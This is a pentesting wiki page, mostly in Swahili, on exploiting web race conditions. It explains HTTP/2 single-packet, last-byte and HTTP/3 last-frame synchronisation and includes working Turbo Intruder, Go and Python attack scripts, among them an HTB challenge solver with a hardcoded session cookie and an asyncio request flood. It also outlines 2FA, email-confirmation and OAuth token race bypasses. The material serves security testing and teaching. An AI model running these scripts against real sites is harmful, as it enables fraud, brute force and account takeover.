# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Kwa kupata uelewa wa kina wa teknik hii angalia ripoti ya awali katika [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Kuimarisha mashambulizi ya Race Condition

Kizuizi kikuu katika kutumia race conditions ni kuhakikisha kwamba requests nyingi zinashughulikiwa kwa wakati mmoja, zikiwa na **tofauti ndogo sana katika nyakati zao za usindikaji—kikamilifu, chini ya 1ms**.

Hapa unaweza kupata mbinu kadhaa za Kusawazisha Maombi:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 'Last-Byte Sync'

- **HTTP/2**: Inaruhusu kutuma requests mbili juu ya muunganisho mmoja wa TCP, ikipunguza athari za jitter ya mtandao. Hata hivyo, kutokana na tofauti upande wa server, requests mbili zinaweza zisitosheleze kwa exploit thabiti ya Race Condition.
- **HTTP/1.1 'Last-Byte Sync'**: Inawezesha kutuma mapema sehemu kubwa za requests 20-30, ukihifadhi kipande kidogo, ambacho kinasafirishwa pamoja baadaye, ikipata kuwasili kwa wakati mmoja kwenye server.

**Maandalizi kwa Last-Byte Sync** yanajumuisha:

1. Kutuma headers na body data minus byte ya mwisho bila kumaliza stream.
2. Kusitisha kwa 100ms baada ya kutuma awali.
3. Kuzima TCP_NODELAY ili kutumia Nagle's algorithm kwa kuunganisha final frames.
4. Kupiga ping ili kupasha moto muunganisho.

Kutumwa kwa baadaye kwa frames zilizohifadhiwa kunapaswa kusababisha kuwasili kwao katika packet moja, jambo linalothibitishwa kwa Wireshark. Njia hii haiendani na static files, ambazo kawaida hazihusishwi na RC attacks.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 inatumia QUIC (UDP). Hakuna TCP coalescing au Nagle ya kutilia maanani, hivyo classic last‑byte sync haifanyi kazi na clients za kawaida. Badala yake, unahitaji kwa makusudi kuunganisha multiple QUIC stream‑final DATA frames (FIN) ndani ya datagram moja ya UDP ili server ichanganyike na kusindika requests zote lengwa katika scheduling tick moja.
- **How to do it**: Tumia library iliyotengenezwa kwa madhumuni ambayo inaonyesha udhibiti wa QUIC frames. Kwa mfano, H3SpaceX inabadilisha quic-go kutekeleza HTTP/3 last‑frame synchronization kwa requests zote zenye body na requests za aina ya GET bila body.
- Requests‑with‑body: tuma HEADERS + DATA minus byte ya mwisho kwa N streams, kisha flush byte ya mwisho ya kila stream pamoja.
- GET‑style: unda fake DATA frames (au body ndogo yenye Content‑Length) na maliza streams zote katika datagram moja.
- **Practical limits**:
- Concurrency inazuiliwa na parameter ya usafirishaji QUIC max_streams ya peer (kana vile HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). Ikiwa ni ndogo, fungua H3 connections nyingi na gawa race kwao.
- UDP datagram size na path MTU vinaweka kiwango cha ni wangapi stream‑final frames unaweza kuunganisha. Library inashughulikia kugawanya kwenye datagrams nyingi ikiwa inahitajika, lakini flush ya single‑datagram ndiyo yenye kuaminika zaidi.
- **Practice**: Kuna maabara za umma za H2/H3 race na sample exploits zinazoambatana na H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Kuendana na Mimari ya Seva

Kuelewa mimari ya lengo ni muhimu. Front-end servers zinaweza kupitisha requests kwa njia tofauti, na kuathiri timing. Preemptive server-side connection warming, through inconsequential requests, might normalize request timing.

#### Handling Session-Based Locking

Frameworks like PHP's session handler serialize requests by session, potentially obscuring vulnerabilities. Utilizing different session tokens for each request can circumvent this issue.

#### Overcoming Rate or Resource Limits

Kama connection warming haitoi matokeo, kuanzisha web servers' rate or resource limit delays kwa makusudi kupitia flood ya dummy requests kunaweza kuwezesha single-packet attack kwa kusababisha server-side delay inayofaa kwa race conditions.

## Mifano ya Mashambulizi

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Unaweza kutuma request kwa **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), unaweza kubadilisha kwenye request thamani unayotaka ku-brute force kwa **`%s`** kama katika `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` na kisha uchague **`examples/race-single-packer-attack.py`** kutoka kwenye drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Ikiwa wavuti haitegemei HTTP2 (inatumia tu HTTP1.1) tumia `Engine.THREADED` au `Engine.BURP` badala ya `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Ikiwa unahitaji kutuma request kwa 1 endpoint kisha nyingi kwa endpoints nyingine ili kusababisha RCE, unaweza kubadilisha script `race-single-packet-attack.py` na kitu kama:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Inapatikana pia katika **Repeater** kupitia chaguo jipya '**Send group in parallel**' katika Burp Suite.
- Kwa **limit-overrun** unaweza kuongeza tu **same request 50 times** katika group.
- Kwa **connection warming**, unaweza **add** mwanzoni mwa **group** baadhi ya **requests** kwa sehemu isiyo static ya web server.
- Kwa **delaying** mchakato **between** processing **one request and another** katika hatua za 2 substates, unaweza **add extra requests between** both requests.
- Kwa **multi-endpoint** RC unaweza kuanza kutuma **request** ambayo **goes to the hidden state** kisha **50 requests** mara baada yake ambazo **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Lengo la script hii ni kubadilisha email ya mtumiaji huku ikiendelea kuithibitisha hadi verification token ya email mpya ifike kwa email ya mwisho (hii ni kwa sababu kwenye code ilionekana RC ambapo ilikuwa inawezekana kubadilisha email lakini verification ikatumwa kwa ile ya zamani kwa sababu variable inayoonyesha email ilikuwa tayari imejazwa na ile ya kwanza).\
When the word "objetivo" is found in the received emails we know we received the verification token of the changed email and we end the attack.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: maelezo ya engine na gating

- Engine selection: tumia `Engine.BURP2` kwenye targets za HTTP/2 ili kusababisha single‑packet attack; tumia `Engine.THREADED` au `Engine.BURP` kwa HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: weka nakala nyingi kwa `gate='race1'` (au per‑attempt gates), ambazo zinashikilia mkia wa kila request; `openGate('race1')` hutoroka miisho yote pamoja ili zifikie karibu kwa wakati mmoja.
- Diagnostics: alama za wakati hasi katika Turbo Intruder zinaonyesha server ilijibu kabla request ilipotumwa kikamilifu, zikithibitisha overlap. Hii inatarajiwa katika true races.
- Connection warming: tuma ping au requests chache zisizo hatari kwanza ili kuthibisha timings; hiari, zima `TCP_NODELAY` ili kuhamasisha batching ya final frames.


### Kuboresha Single Packet Attack

Katika utafiti wa awali ilielezwa kuwa attack hii ina kikomo cha 1,500 bytes. Hata hivyo, katika [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), ilielezwa jinsi ilivyowezekana kupanua kikomo cha 1,500-byte cha single packet attack hadi **65,535 B window limitation of TCP by using IP layer fragmentation** (kugawanya single packet kuwa multiple IP packets) na kuzituma kwa mpangilio tofauti, jambo lililoruhusu kuzuia reassembly ya packet hadi fragments zote zifikie server. Teknik hii iliwasaidia mtafiti kutuma 10,000 requests katika takriban 166ms.

Kumbuka kwamba ingawa maboresho haya hufanya attack iwe ya kuaminika zaidi katika RC zinazohitaji mamia/elufu za packets kufika kwa wakati mmoja, yanaweza pia kuwa na vikwazo vya programu. Baadhi ya HTTP servers maarufu kama Apache, Nginx na Go wana setting kali ya `SETTINGS_MAX_CONCURRENT_STREAMS` kwa 100, 128 na 250. Hata hivyo, wengine kama NodeJS na nghttp2 wana bila kikomo.  
Hii kwa msingi inamaanisha kwamba Apache itazingatia tu 100 HTTP connections kutoka kwa single TCP connection (kikikandamiza RC attack hii). Kwa HTTP/3, limit inayofanana ni QUIC’s max_streams transport parameter – ikiwa ni ndogo, gonga race yako kwa multiple QUIC connections.

Unaweza kupata baadhi ya mifano inayotumia teknik hii kwenye repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Kabla ya utafiti huo, hizi zilikuwa baadhi ya payloads zilizotumika ambazo zilijaribu tu kutuma packets haraka iwezekanavyo ili kusababisha RC.

- **Repeater:** Angalia mifano kutoka sehemu iliyopita.
- **Intruder**: Tuma **request** kwa **Intruder**, weka **number of threads** kuwa **30** ndani ya **Options menu**, chagua kama payload **Null payloads** na tengeneza **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Hii ni aina ya msingi zaidi ya race condition ambapo **vulnerabilities** zinaonekana katika sehemu zinazopunguza idadi ya mara unazoweza kufanya kitendo. Kama kutumia msimbo wa punguzo mara nyingi katika duka la mtandao. Mfano rahisi unaweza kupatikana katika [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) au katika [**this bug**](https://hackerone.com/reports/759247)**.**

Kuna mabadiliko mengi ya aina hii ya shambulio, ikiwa ni pamoja na:

- Kutumia gift card mara nyingi
- Kuweka rating kwa bidhaa mara nyingi
- Kutoa au kuhamisha pesa zaidi ya salio la akaunti yako
- Kutumia tena suluhisho la CAPTCHA moja
- Kupita kikomo cha rate cha anti-brute-force

### **Hidden substates**

Kuchukua fursa ya race conditions tata mara nyingi kunahusisha kutumia nafasi fupi za kuingiliana na hidden au **unintended machine substates**. Hivi ndivyo ya kukaribia hili:

1. **Identify Potential Hidden Substates**
- Anza kwa kutambua endpoints zinazobadilisha au kuingiliana na data muhimu, kama user profiles au password reset processes. Lenga kwenye:
- **Storage**: Tenga endpoints zinazoshughulikia server-side persistent data badala ya zile zinazoendesha data client-side.
- **Action**: Tafuta operations zinazobadilisha data iliyopo, ambazo zina uwezekano mkubwa wa kuunda masharti yanayoweza kutumika ikilinganishwa na zile zinazoongeza data mpya.
- **Keying**: Shambulio zenye mafanikio kawaida zinahusisha operations zinazotegemea kitambulisho kimoja, kwa mfano username au reset token.
2. **Conduct Initial Probing**
- Jaribu endpoints zilizoainishwa kwa race condition attacks, ukiangalia kwa ajili ya utofauti wowote dhidi ya matokeo yanayotarajiwa. Majibu yasiyotegemewa au mabadiliko katika tabia ya application yanaweza kuashiria vulnerability.
3. **Demonstrate the Vulnerability**
- Punguza shambulio hadi idadi ndogo zaidi ya requests zinazohitajika ili kutekeleza vulnerability, mara nyingi ni mbili tu. Hatua hii inaweza kuhitaji jaribio nyingi au automation kutokana na timing mahususi inayohitajika.

### Time Sensitive Attacks

Usahihi wa timing ya requests unaweza kufichua vulnerabilities, hasa wakati njia zinazotarajiwa kama timestamps zinatumika kwa security tokens. Kwa mfano, kuunda password reset tokens kwa msingi wa timestamps kunaweza kuruhusu tokens sawia kwa requests zinazoendana kwa wakati mmoja.

**To Exploit:**

- Tumia timing sahihi, kama single packet attack, kufanya concurrent password reset requests. Tokens sawia zinaonyesha vulnerability.

**Example:**

- Omba password reset tokens mbili kwa wakati mmoja na uzilinganishe. Tokens zinazolingana zinaonyesha kasoro katika uundaji wa token.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.

### Confirm other emails

Mfano ni kujaribu **verify an email address and change it to a different one at the same time** kuona kama jukwaa linathibitisha anwani mpya iliyobadilishwa.

### Change email to 2 emails addresses Cookie based

Kulingana na [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab ilikuwa hatarini kwa takeover namna hii kwa sababu inaweza **send** the **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Ikiwa **2 different writes** zimetumika kuongeza information ndani ya database, kuna sehemu ndogo ya muda ambapo **data ya kwanza tu imeandikwa** ndani ya database. Kwa mfano, wakati wa kuunda user username na password zinaweza kuandikwa kisha token ya kuthibitisha akaunti mpya imeandikwa. Hii inamaanisha kwa muda mfupi token ya kuthibitisha akaunti inaweza kuwa null.

Kwa hiyo, kujisajili akaunti na kutuma requests kadhaa na token tupu (`token=` au `token[]=` au tofauti yoyote) kuthibitisha akaunti mara moja kunaweza kuruhusu kuthibitisha akaunti ambapo hauendoki barua pepe.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

Pseudo-code ifuatayo ina vulnerability ya race condition kwa sababu kwa muda mfupi **2FA is not enforced** wakati session inaundwa:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 uhifadhi wa kudumu

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Huduma hizi zinakuwezesha kuunda application na kuthibitisha watumiaji waliosajiliwa na provider. Ili kufanya hivyo, **client** itahitaji **kuruhusu application yako** kupata baadhi ya data zao ndani ya **OAUth provider**.\
Hadi hapa ni tu login ya kawaida na google/linkedin/github... ambapo utaonyeshwa ukurasa unaosema: "_Programu <InsertCoolName> inataka kupata taarifa zako, ungependa kuiruhusu?_"

#### Race Condition in `authorization_code`

Tatizo linaonekana unapolikubali na kwa moja kwa moja hutuma **`authorization_code`** kwa application hatarishi. Kisha, application hii hutumia Race Condition katika OAUth service provider kuunda zaidi ya AT/RT moja (_Authentication Token/Refresh Token_) kutoka kwa **`authorization_code`** kwa akaunti yako. Kwa msingi, itatumia ukweli kwamba umeikubali application kupata data zako ili **kuunda akaunti nyingi**. Kisha, ikiwa utaacha kuruhusu application kupata data zako, jozi moja ya AT/RT itaondolewa, lakini zingine bado zitabaki halali.

#### Race Condition in `Refresh Token`

Mara tu unapopata **RT halali** unaweza kujaribu **kuitumia vibaya ili kuunda AT/RT nyingi** na **hata kama mtumiaji ataondoa ruhusa** kwa application hatarishi kufikia data yake, **RT nyingi bado zitatumika.**

## **RC in WebSockets**

- Katika [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) unaweza kupata PoC kwa Java ya kutuma ujumbe za websocket kwa **sambamba** ili kutumia Race Conditions pia katika Web Sockets.
- Kwa kutumia Burp’s WebSocket Turbo Intruder unaweza kutumia injini ya **THREADED** kuanzisha muunganisho nyingi za WS na kupiga payloads kwa sambamba. Anza na mfano rasmi na rekebisha `config()` (idadi ya thread) kwa ajili ya concurrency; mara nyingi hii ni ya kuaminika zaidi kuliko batching kwenye muunganisho mmoja wakati wa kukimbiza server‑side state kupitia WS handlers. Angalia [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Marejeleo

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
